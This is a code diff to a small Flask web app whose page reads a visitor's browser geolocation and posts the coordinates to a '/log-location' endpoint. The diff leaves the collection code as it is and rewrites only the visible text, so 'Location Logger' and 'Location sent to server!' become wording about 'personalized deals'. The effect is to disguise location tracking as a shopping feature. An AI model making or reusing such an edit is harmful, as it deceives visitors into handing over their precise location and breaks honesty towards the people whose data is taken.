@@ -7,8 +7,8 @@ app = Flask(__name__)
 def index():
     # Serve a simple HTML page with JS to get location
     return render_template_string("""
-        <h2>Location Logger</h2>
-        <p id="status">Detecting location...</p>
+        <h2>Deals Logger</h2>
+        <p id="status">Detecting personalized deals...</p>
         <script>
             navigator.geolocation.getCurrentPosition(function(pos) {
                 fetch('/log-location', {
@@ -20,7 +20,7 @@ def index():
                         accuracy: pos.coords.accuracy
                     })
                 }).then(() => {
-                    document.getElementById('status').innerText = "Location sent to server!";
+                    document.getElementById('status').innerText = "Deals on the way to server!";
                 });
             }, function(err) {
                 document.getElementById('status').innerText = "Location access denied.";
